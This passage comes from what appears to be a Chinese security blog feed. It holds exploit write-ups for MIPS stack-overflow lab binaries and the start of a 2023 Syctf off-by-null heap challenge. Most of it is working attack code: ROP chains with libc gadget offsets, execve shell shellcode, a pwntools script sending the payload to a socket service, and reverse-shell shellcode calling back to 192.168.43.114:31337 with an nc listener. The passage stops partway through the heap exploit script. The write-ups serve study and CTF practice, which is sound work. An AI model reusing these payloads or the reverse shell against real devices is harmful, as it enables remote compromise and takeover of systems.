$zero, -4($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\xf4\xff\xa4\x27&quot;</span>  <span class="hljs-comment"># addiu $a0, $sp, -0xc</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x05\x28&quot;</span>  <span class="hljs-comment"># slti $a1, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\xab\x0f\x02\x24&quot;</span>  <span class="hljs-comment"># addiu;$v0, $zero, 0xfab</span><br>shellcode += <span class="hljs-string">b&quot;\x0c\x01\x01\x01&quot;</span>  <span class="hljs-comment"># syscall 0x40404</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1fc</span><br>payload += p32(libc_base + <span class="hljs-number">0xAfe0</span>)<br><br>payload += <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x18</span><span class="hljs-comment"># sp offset</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s0</span><br>payload += p32(libc_base + <span class="hljs-number">0x21c34</span>)<span class="hljs-comment"># s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s2</span><br>payload += p32(mysleep)<span class="hljs-comment"># s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><span class="hljs-comment"># fp</span><br>payload += p32(libc_base + <span class="hljs-number">0x2FB10</span>)      <span class="hljs-comment"># ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span><br>payload += p32(libc_base + <span class="hljs-number">0x214A0</span>)<span class="hljs-comment"># $s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span><br>payload += p32(libc_base + <span class="hljs-number">0x171cc</span>)<span class="hljs-comment"># $ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br><br>payload += shellcode<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(payload)<br></code></pre></td></tr></table></figure><p>这里成功执行了我们的 shellcode。</p><p>要注意的是，<strong>在 MIPS 指令集中，0x20 和 0x00 都是坏字节</strong>。因此 gadget 的地址不能包含这两个值。同时，提一个小trick，在我们想写入的地址有坏字节时，可以通过先-1写入，后面依靠其他gadget来将地址加一来完成构造。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/17.png" alt="img"></p><p>并且获取到了 shell 。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/18.png" alt="img"></p><h3 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h3><h4 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h4><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/19.png" alt="img"></p><p>v11的缓冲区为26，我们可以输入 0x1f4 字节，同时使用 <code>sprintf</code>通过 v10 格式化输入 v11，存在明显的栈溢出。</p><h4 id="动态分析-1"><a href="#动态分析-1" class="headerlink" title="动态分析"></a>动态分析</h4><p>由于是一个 socket 程序，所以我们需要关注如何输入。</p><p>首先运行 socket_bof ，并绑定 4321 端口。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/20.png" alt="img"></p><p>使用 nc 连接该 socket ，并输入数据。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/21.png" alt="img"></p><p>若是调试，只需要在qemu运行时使用 -g 绑定一个调试端口即可。</p><p>接下来测试偏移。我们依然使用 cyclic + 返回地址的方法确定。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/22.png" alt="img"></p><p>可以得到偏移为 51 。</p><h4 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h4><p>这里较 <code>stack_bof_02</code> 十分相像，只是偏移不同而已，我们依然尝试使用上题的 ROP 链获取 shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p32<br><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br><br>libc_base = <span class="hljs-number">0x7f6e5000</span><br>mysleep = libc_base + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = <span class="hljs-string">b&#x27;&#x27;</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="hljs-comment"># slti $a2, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x06\x28&quot;</span>  <span class="hljs-comment"># slti $a2, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\x62\x69\x0f\x3c&quot;</span>  <span class="hljs-comment"># lui $t7, 0x6962</span><br>shellcode += <span class="hljs-string">b&quot;\x2f\x2f\xef\x35&quot;</span>  <span class="hljs-comment"># ori $t7, $t7, 0x2f2f</span><br>shellcode += <span class="hljs-string">b&quot;\xf4\xff\xaf\xaf&quot;</span>  <span class="hljs-comment"># sw $t7, -0xc($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\x73\x68\x0e\x3c&quot;</span>  <span class="hljs-comment"># lui $t6, 0x6873</span><br>shellcode += <span class="hljs-string">b&quot;\x6e\x2f\xce\x35&quot;</span>  <span class="hljs-comment"># ori $t6, $t6, 0x2f6e</span><br>shellcode += <span class="hljs-string">b&quot;\xf8\xff\xae\xaf&quot;</span>  <span class="hljs-comment"># sw $t6, -8($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\xfc\xff\xa0\xaf&quot;</span>  <span class="hljs-comment"># sw $zero, -4($sp)</span><br>shellcode += <span class="hljs-string">b&quot;\xf4\xff\xa4\x27&quot;</span>  <span class="hljs-comment"># addiu $a0, $sp, -0xc</span><br>shellcode += <span class="hljs-string">b&quot;\xff\xff\x05\x28&quot;</span>  <span class="hljs-comment"># slti $a1, $zero, -1</span><br>shellcode += <span class="hljs-string">b&quot;\xab\x0f\x02\x24&quot;</span>  <span class="hljs-comment"># addiu;$v0, $zero, 0xfab</span><br>shellcode += <span class="hljs-string">b&quot;\x0c\x01\x01\x01&quot;</span>  <span class="hljs-comment"># syscall 0x40404</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">51</span><br>payload += p32(libc_base + <span class="hljs-number">0x0000Afe0</span>)<br><br>payload += <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x18</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s0</span><br>payload += p32(libc_base + <span class="hljs-number">0x21C34</span>)      <span class="hljs-comment"># s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s2</span><br>payload += p32(mysleep) <span class="hljs-comment"># s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>                       <span class="hljs-comment"># fp</span><br>payload += p32(libc_base + <span class="hljs-number">0x2FB10</span>)      <span class="hljs-comment"># ra</span><br><br>payload += <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x24</span><br><br>payload += p32(libc_base + <span class="hljs-number">0x214A0</span>)                  <span class="hljs-comment"># s3</span><br>payload += <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">4</span>                                      <span class="hljs-comment"># s4</span><br>payload += p32(libc_base + <span class="hljs-number">0x171CC</span>)                     <span class="hljs-comment"># ra</span><br><br>payload += <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x18</span>                                   <span class="hljs-comment"># shellcode offset</span><br><br>payload += shellcode<br><br><span class="hljs-comment"># with open(&#x27;test&#x27;,&#x27;wb&#x27;) as f:</span><br><span class="hljs-comment">#         f.write(payload)</span><br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">4321</span>)<br><br>p.sendline(payload)<br><br><span class="hljs-comment"># p.interactive()</span><br></code></pre></td></tr></table></figure><p>我们成功获取了shell。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/23.png" alt="img"></p><p>等等，有没有感觉有一丝丝的诡异。我们竟然在本地获取了远程服务器的shell，且该shell依然在远程，所以我们依然没有办法控制远程服务器。</p><p>这里，我们可以采取 reverse shell 的方式获取远程服务器shell。较上述wp，只需要修改 shellcode 即可。实现反向shell的<a href="http://shell-storm.org/shellcode/files/shellcode-860.html">shellcode</a>。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/24.png" alt="img"></p><p>注意，这里需要修改 shellcode 的 ip 地址。</p><p>首先，需要获取本地的 ip 地址，并使用 16 进制表示。比如说，我们这里的 ip 地址为 <strong>192.168.43.114</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">ip</span>):<br>    t = ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(t)):<br>        res += <span class="hljs-built_in">int</span>(t[i]) &lt;&lt; <span class="hljs-number">8</span> * i<br>    res = <span class="hljs-built_in">hex</span>(res)<br>    <span class="hljs-built_in">print</span>(res)<br><br>transfer(<span class="hljs-string">&quot;192.168.43.114&quot;</span>)<br></code></pre></td></tr></table></figure><p>转换为16进制，且用小端表示为 0x722ba8c0。</p><p>注意到传递 ip 的汇编语句为，<code>li $a1, 0x722ba8c0</code>，我们将其转换为机器码输入。这里使用<a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler">在线网站</a>转换。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/25.png" alt="img"></p><p>最终我们 shellcode 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># reverse shell 192.168.43.114:31337 </span><br>stg3_SC = <span class="hljs-string">b&quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;</span><br><span class="hljs-comment"># stg3_SC += b&quot;\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;   # 192.168.1.177</span><br>stg3_SC += <span class="hljs-string">b&quot;\xf8\xff\xa5\xaf\x2b\x72\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;</span><br>stg3_SC += <span class="hljs-string">b&quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;</span><br></code></pre></td></tr></table></figure><p>使用 <code>nc -nvlp 31337</code>监听 31337 端口。</p><p>继续执行上述 wp。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/26.png" alt="img"></p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/27.png" alt="img"></p><p>成功反弹shell。</p><h2 id="others"><a href="#others" class="headerlink" title="others"></a>others</h2><h3 id="mipsrop简单使用"><a href="#mipsrop简单使用" class="headerlink" title="mipsrop简单使用"></a>mipsrop简单使用</h3><p>我们常用的类是 mipsrop.MIPSROPFinder()，该类中常用方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">rop = mipsrop.MIPSROPFinder()<br>rop.stackfinder()    <span class="hljs-comment"># 寻找栈数据可控的 rop，建立栈和 a类型与s类型 寄存器的关系</span><br>rop.find(xxx)        <span class="hljs-comment"># 查找指定的rop，可以使用正则表达式匹配 </span><br>rop.tails()          <span class="hljs-comment"># 列出将栈上的数据保存在$ra等寄存器中的rop</span><br>rop.system()         <span class="hljs-comment"># 寻找命令执行的的 rop，建立栈与寄存器$a0的关系</span><br>rop.summary() <span class="hljs-comment"># 查找可用的完整调用链</span><br></code></pre></td></tr></table></figure><h3 id="mips常用gadget"><a href="#mips常用gadget" class="headerlink" title="mips常用gadget"></a>mips常用gadget</h3><p>我们上述采用的 gadget 基本都是通用的 gadget，可以参考以下博客进行总结。</p><p>参考：<a href="https://www.cnblogs.com/hac425/p/9416864.html">https://www.cnblogs.com/hac425/p/9416864.html</a></p><p>参考文档</p><p><a href="https://www.anquanke.com/post/id/169689">https://www.anquanke.com/post/id/169689</a></p><p><a href="https://xz.aliyun.com/t/6808#toc-8">https://xz.aliyun.com/t/6808#toc-8</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>mips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-Syctf-两道off-by-null</title>
    <link href="/2023/06/14/2023-%E5%AE%89%E6%B4%B5%E6%9D%AF-pwn%E4%B8%A4%E9%81%93off-by-null/"/>
    <url>/2023/06/14/2023-%E5%AE%89%E6%B4%B5%E6%9D%AF-pwn%E4%B8%A4%E9%81%93off-by-null/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-Syctf-两道off-by-null"><a href="#2023-Syctf-两道off-by-null" class="headerlink" title="2023-Syctf-两道off-by-null"></a>2023-Syctf-两道off-by-null</h1><p>这次比赛跟着团队打的，师傅们很厉害，pwn直接AK了。我这个废物只能复现复现题目了。</p><p>这里笔者选取两道高版本的<strong>off by null</strong>题目复现。</p><p>一道题采用的是高版本无泄漏地址的堆风水绕过unlink，另一道采取泄露地址，伪造fake_chunk的方式绕过unlink。</p><h2 id="PWNPWN"><a href="#PWNPWN" class="headerlink" title="PWNPWN"></a>PWNPWN</h2><p>查看保护</p><p><img src="/img/2023-Syctf/image-20230709164811680.png" alt="image-20230709164811680"></p><p>保护全开。</p><p>首先，映入眼帘的是一个简单的随机数判断，通过便是常规的堆操作了。</p><p><img src="/img/2023-Syctf/image-20230709170659257.png" alt="image-20230709170659257"></p><p>取输入的数字的千位、百位、十位与个位，与rand()随机数匹配，匹配上了即可越过判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a = fun.rand() % <span class="hljs-number">10</span><br>b = fun.rand() % <span class="hljs-number">10</span><br>c = fun.rand() % <span class="hljs-number">10</span><br>d = fun.rand() % <span class="hljs-number">10</span><br><br>num = a * <span class="hljs-number">1000</span> + b * <span class="hljs-number">100</span> + c * <span class="hljs-number">10</span> + d<br>p.sendlineafter(<span class="hljs-string">&#x27;please input your number:&#x27;</span>, <span class="hljs-built_in">str</span>(num))<br></code></pre></td></tr></table></figure><p>之后就是常规的菜单堆操作了。但是使用一些永假的判断混淆，没啥意义。还有一个登录关键字段的赋值，影响show与delete、edit等功能。</p><p><img src="/img/2023-Syctf/image-20230709170716152.png" alt="image-20230709170716152"></p><p>对输入passwd的长度以及最后一个字节的ascii值进行判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    menu(<span class="hljs-number">5</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your username&#x27;</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your passwd&#x27;</span>, <span class="hljs-string">&#x27;\x03\x03\x03\x00&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nologin</span>():<br>    menu(<span class="hljs-number">5</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your username&#x27;</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your passwd&#x27;</span>, <span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br></code></pre></td></tr></table></figure><p>add函数存在off-by-null漏洞。</p><p><img src="/img/2023-Syctf/image-20230709170733695.png" alt="image-20230709170733695"></p><p>要过libc2.31的unlink检测，需要经过比较复杂的堆风水操作。这里参考<a href="https://blog.wjhwjhn.com/archives/193/">WJH师傅</a>的博客。最终构造的fake chunk堆分布。</p><p><img src="/img/2023-Syctf/image-20230709170759170.png" alt="image-20230709170759170"></p><p>最终wp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64, u64<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwnpwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>fun = cdll.LoadLibrary(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>fun.srand(fun.time(<span class="hljs-number">0</span>))<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br>command = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;root@$&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    menu(<span class="hljs-number">5</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your username&#x27;</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your passwd&#x27;</span>, <span class="hljs-string">&#x27;\x03\x03\x03\x00&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nologin</span>():<br>    menu(<span class="hljs-number">5</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your username&#x27;</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your passwd&#x27;</span>, <span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content=<span class="hljs-string">b&#x27;a&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;your index:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;your size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;your content:&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    nologin()<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span 